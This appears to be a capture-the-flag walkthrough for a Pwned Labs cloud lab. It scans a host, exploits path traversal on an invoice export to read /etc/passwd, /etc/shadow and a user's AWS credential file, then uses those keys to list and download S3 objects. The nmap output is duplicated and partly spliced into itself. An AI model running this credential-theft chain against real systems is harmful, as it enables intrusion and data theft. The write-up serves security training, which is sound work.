https://app.pwnedlabs.io/labs/path-traversal-to-aws-credentials-to-s3

### Scenario

Huge Logistics, known for its global operations, has brought your team on board to scrutinize the integrity of their external defenses. They've pointed you toward an IP address that leads to their invoicing portal. Your assignment: rigorously test the website's security, then extend that scrutiny to any linked cloud infrastructure. Dive deep, expose vulnerabilities, and illustrate their potential consequences to help protect Huge Logistics against cyber threats.

### Information provided

```
IP address:

13.50.73.5
```

### Enumeration

Since the only information provided to us is a public IP address, we will perform the service enumeration of that IP address to see if there are any exploitable services present.

```
nmap 13.50.73.5
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 15:42 IST
Nmap scan report for ec2-13-50-73-5.eu-north-1.compute.amazonaws.com (13.50.73.5)
Host is up (0.32s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```

Since TCP-80 is open, we will try to further enumerate it:-

```
nmap 13.50.73.5 -p80 -sV -sC
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 15:43 IST
WARNING: Service 13.50.73.5:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for ec2-13-50-73-5.eu-north-1.compute.amazonaws.com (13.50.73.5)
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
80/tcp open  rtsp
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: application/json
|     Content-Length: 163
|     {"error":{"message":"The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.","type":"NotFound"}}
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2359
|     Vary: Cookie
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/main.css">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/navbar.css">
|     <link rel="shortcut icon" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/images/favicon.ico">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/home.css">
|     <title>Home - Huge Logistics.</title>
|     </head>
|     <body>
|     <div class="navbar">
|     <ul>
|     <li><a class="nav-
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|_    Content-Length: 0
|_http-title: Home - Huge Logistics.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=9/13%Time=6AA67748%P=x86_64-unknown-linux-gnu%r
SF:(GetRequest,996,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\nmap 13.50.73.5 -p80 -sV -sC
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-13 15:43 IST
WARNING: Service 13.50.73.5:80 had already soft-matched rtsp, but now soft-matched sip; ignoring second value
Nmap scan report for ec2-13-50-73-5.eu-north-1.compute.amazonaws.com (13.50.73.5)
Host is up (0.32s latency).

PORT   STATE SERVICE VERSION
80/tcp open  rtsp
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: application/json
|     Content-Length: 163
|     {"error":{"message":"The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.","type":"NotFound"}}
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2359
|     Vary: Cookie
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/main.css">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/navbar.css">
|     <link rel="shortcut icon" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/images/favicon.ico">
|     <link rel="stylesheet" href="https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com/static/css/home.css">
|     <title>Home - Huge Logistics.</title>
|     </head>
|     <body>
|     <div class="navbar">
|     <ul>
|     <li><a class="nav-
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, GET, OPTIONS
|_    Content-Length: 0
|_http-title: Home - Huge Logistics.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.95%I=7%D=9/13%Time=6AA67748%P=x86_64-unknown-linux-gnu%r
SF:(GetRequest,996,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\
SF:x20charset=utf-8\r\nContent-Length:\x202359\r\nVary:\x20Cookie\r\n\r\n<
SF:html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20\n\n\x20\x20\x20\x20<meta
SF:\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Comp
SF:atible\"\x20content=\"IE=edge\">\n\x20\x20\x20\x20<meta\x20name=\"viewp
SF:ort\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x
SF:20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https://huge-logistics-
SF:bucket\.s3\.eu-north-1\.amazonaws\.com/static/css/main\.css\">\n\x20\x2
SF:0\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https://huge-logistics-b
SF:ucket\.s3\.eu-north-1\.amazonaws\.com/static/css/navbar\.css\">\n\x20\x
SF:20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20href=\"https://huge-logi
SF:stics-bucket\.s3\.eu-north-1\.amazonaws\.com/static/images/favicon\.ico
SF:\">\n\x20\x20\x20\x20\n<link\x20rel=\"stylesheet\"\x20href=\"https://hu
SF:ge-logistics-bucket\.s3\.eu-north-1\.amazonaws\.com/static/css/home\.cs
SF:s\">\n\n\x20\x20\x20\x20<title>Home\x20-\x20Huge\x20Logistics\.</title>
SF:\n</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"navbar\">\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<ul>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20class=\"nav-")%r(HTTPOptions
SF:,69,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charset=u
SF:tf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text
SF:/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(FourOhFourRequest,F2,"HTTP/1\.0\x20404\x20NO
SF:T\x20FOUND\r\nContent-Type:\x20application/json\r\nContent-Length:\x201
SF:63\r\n\r\n{\"error\":{\"message\":\"The\x20requested\x20URL\x20was\x20n
SF:ot\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20
SF:URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x2
SF:0again\.\",\"type\":\"NotFound\"}}\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 secondsr\nContent-Length:\x202359\r\nVary:\x20Cookie\r\n\r\n<
SF:html\x20lang=\"en\">\n<head>\n\x20\x20\x20\x20\n\n\x20\x20\x20\x20<meta
SF:\x20charset=\"UTF-8\">\n\x20\x20\x20\x20<meta\x20http-equiv=\"X-UA-Comp
SF:atible\"\x20content=\"IE=edge\">\n\x20\x20\x20\x20<meta\x20name=\"viewp
SF:ort\"\x20content=\"width=device-width,\x20initial-scale=1\.0\">\n\x20\x
SF:20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https://huge-logistics-
SF:bucket\.s3\.eu-north-1\.amazonaws\.com/static/css/main\.css\">\n\x20\x2
SF:0\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https://huge-logistics-b
SF:ucket\.s3\.eu-north-1\.amazonaws\.com/static/css/navbar\.css\">\n\x20\x
SF:20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20href=\"https://huge-logi
SF:stics-bucket\.s3\.eu-north-1\.amazonaws\.com/static/images/favicon\.ico
SF:\">\n\x20\x20\x20\x20\n<link\x20rel=\"stylesheet\"\x20href=\"https://hu
SF:ge-logistics-bucket\.s3\.eu-north-1\.amazonaws\.com/static/css/home\.cs
SF:s\">\n\n\x20\x20\x20\x20<title>Home\x20-\x20Huge\x20Logistics\.</title>
SF:\n</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20\n\x
SF:20\x20\x20\x20\x20\x20\x20\x20<div\x20class=\"navbar\">\n\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20<ul>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20<li><a\x20class=\"nav-")%r(HTTPOptions
SF:,69,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x20text/html;\x20charset=u
SF:tf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nContent-Length:\x200\r\n\
SF:r\n")%r(RTSPRequest,69,"RTSP/1\.0\x20200\x20OK\r\nContent-Type:\x20text
SF:/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20GET,\x20OPTIONS\r\nConten
SF:t-Length:\x200\r\n\r\n")%r(FourOhFourRequest,F2,"HTTP/1\.0\x20404\x20NO
SF:T\x20FOUND\r\nContent-Type:\x20application/json\r\nContent-Length:\x201
SF:63\r\n\r\n{\"error\":{\"message\":\"The\x20requested\x20URL\x20was\x20n
SF:ot\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\x20the\x20
SF:URL\x20manually\x20please\x20check\x20your\x20spelling\x20and\x20try\x2
SF:0again\.\",\"type\":\"NotFound\"}}\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.17 seconds
```

We get some information like this service is running on an EC2 instance from AWS and there are some links of S3 buckets also present.

### Web enumeration

![](Pasted%20image%2020260913165002.png)

After knowing that this is a webpage, I checked for `robots.txt` and `sitemap.xml` both of which are absent currently.

Next, we move to directory enumeration with `ffuf`

```
ffuf -w /home/ayush-parab/ayush/SecLists/Discovery/Web-Content/common.txt -u http://13.50.73.5/FUZZ
```

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://13.50.73.5/FUZZ
 :: Wordlist         : FUZZ: /home/ayush-parab/ayush/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

download                [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 323ms]
invoices                [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 320ms]
login                   [Status: 200, Size: 2483, Words: 631, Lines: 78, Duration: 315ms]
news                    [Status: 500, Size: 62, Words: 1, Lines: 2, Duration: 321ms]
profile                 [Status: 302, Size: 199, Words: 18, Lines: 6, Duration: 315ms]
signup                  [Status: 200, Size: 2500, Words: 632, Lines: 78, Duration: 318ms]
:: Progress: [4751/4751] :: Job [1/1] :: 89 req/sec :: Duration: [0:00:54] :: Errors: 0 ::
```

Here we can see that `login` and `signup` have received HTTP 200 OK as a response. 

![](Pasted%20image%2020260913165303.png)

On the page to register, I registered using a dummy account with credentials `test:test`

![](Pasted%20image%2020260913165355.png)

It opens the `invoices` page which has some data that can be exported.

We then click on `export to csv` button and observe the URL in BurpSuite.

![](Pasted%20image%2020260913165506.png)

Since the file is getting downloaded using the filename, we can try the path traversal vulnerability over here.

![](Pasted%20image%2020260913165555.png)

We set the payloads assuming that this is a linux server.

![](Pasted%20image%2020260913165627.png)

As you can see, we received a HTTP 200 OK on one of the paths, implying that the website is vulnerable to path traversal.

We can now download the `/etc/passwd` and `/etc/shadow` files to try and crack the credentials.
However, we are not successful to crack those.

![](Pasted%20image%2020260913165751.png)

In `/etc/passwd` we can see that there is the default `ec2-user` and a `nedf` user. We can then try to get the credentials for `nedf` user from his `.aws` directory.

![](Pasted%20image%2020260913165858.png)

And our guess was right, we do see the credentials configured!

### Initial foothold

We will configure these credentials in our profile and try.

```
aws sts get-caller-identity
```

```
{
    "UserId": "AIDATWVWNKAVEJCVKW2CS",
    "Account": "254859366442",
    "Arn": "arn:aws:iam::254859366442:user/data-user"
}
```

We are successfully logged in!

### Data exfiltration

After trying a few commands, we move on to the S3 bucket which we had received the name of in the source code of the vulnerable website.

```
https://huge-logistics-bucket.s3.eu-north-1.amazonaws.com
```

```
huge-logistics-bucket
```

```
aws s3api list-objects-v2 --bucket huge-logistics-bucket --profile nedf
```

```
{
    "Contents": [
        {
            "Key": "flag.txt",
            "LastModified": "2023-06-28T16:21:50+00:00",
            "ETag": "\"102723d24788e5352ac7aa4dab58a419\"",
            "Size": 32,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/auth.css",
            "LastModified": "2023-06-29T13:37:36+00:00",
            "ETag": "\"57acb697969fb779713d96bdd688f772\"",
            "Size": 2505,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/home.css",
            "LastModified": "2023-06-28T16:20:01+00:00",
            "ETag": "\"9913ad390489a454b60dc9de1502901f\"",
            "Size": 656,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/invoices.css",
            "LastModified": "2023-06-28T16:20:03+00:00",
            "ETag": "\"2ae2bdabd6ef75aef2b1afd227f3ff45\"",
            "Size": 882,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/main.css",
            "LastModified": "2023-06-28T16:20:03+00:00",
            "ETag": "\"d03c316cd410e3c5d5db5bc7cfdbc6c2\"",
            "Size": 1415,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/navbar.css",
            "LastModified": "2023-06-28T16:20:05+00:00",
            "ETag": "\"1fb402d30355188b6c8c854d1728ebdd\"",
            "Size": 1327,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/news.css",
            "LastModified": "2023-06-28T16:20:06+00:00",
            "ETag": "\"aa288045edd006f21a269d9531d5fdf8\"",
            "Size": 149,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/css/pay.css",
            "LastModified": "2023-06-28T16:20:07+00:00",
            "ETag": "\"1a08062e8c5164c1746c1d3ff9c38f48\"",
            "Size": 1078,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/images/favicon.ico",
            "LastModified": "2023-06-28T16:19:51+00:00",
            "ETag": "\"23287c64c9cb99cf3ec35be449b7f5f1\"",
            "Size": 15996,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/images/hero.jpg",
            "LastModified": "2023-06-28T16:19:59+00:00",
            "ETag": "\"1c3f3d5ee3b19b3434f12267aa29f1bb\"",
            "Size": 251708,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/api.js",
            "LastModified": "2023-07-02T20:28:17+00:00",
            "ETag": "\"e3fad4c97ed39f5b200bf72ba7c90c91\"",
            "Size": 1586,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/auth.js",
            "LastModified": "2023-06-28T16:20:08+00:00",
            "ETag": "\"bd2a3d000e3e804c07aace41c0f82bc0\"",
            "Size": 564,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/invoices.js",
            "LastModified": "2023-06-28T16:20:09+00:00",
            "ETag": "\"801afb68bb3641480e383461c28dbe44\"",
            "Size": 77,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/jquery.min.js",
            "LastModified": "2023-06-28T16:20:13+00:00",
            "ETag": "\"7f9fb969ce353c5d77707836391eb28d\"",
            "Size": 84355,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/jquery.min.map",
            "LastModified": "2023-06-28T16:20:16+00:00",
            "ETag": "\"f36bd42238f343a13e5fb2e43f1242f4\"",
            "Size": 127542,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/menu.js",
            "LastModified": "2023-06-28T16:20:17+00:00",
            "ETag": "\"d725056f9b039ae438ccda26ac52d170\"",
            "Size": 290,
            "StorageClass": "STANDARD"
        },
        {
            "Key": "static/js/pay.js",
            "LastModified": "2023-06-28T16:20:17+00:00",
            "ETag": "\"81767eb907f82607b106b3d77b6077ee\"",
            "Size": 253,
            "StorageClass": "STANDARD"
        }
    ],
    "RequestCharged": null,
    "Prefix": ""
}
```

In this output, we can see that `flag.txt` is present.

```
aws s3api get-object --bucket huge-logistics-bucket --key flag.txt ./flag.txt --profile nedf
```

``` 
{
    "AcceptRanges": "bytes",
    "LastModified": "2023-06-28T16:21:50+00:00",
    "ContentLength": 32,
    "ETag": "\"102723d24788e5352ac7aa4dab58a419\"",
    "ContentType": "text/plain",
    "ServerSideEncryption": "AES256",
    "Metadata": {}
}
```

Using the above command, we have successfully exfiltrated the flag file!
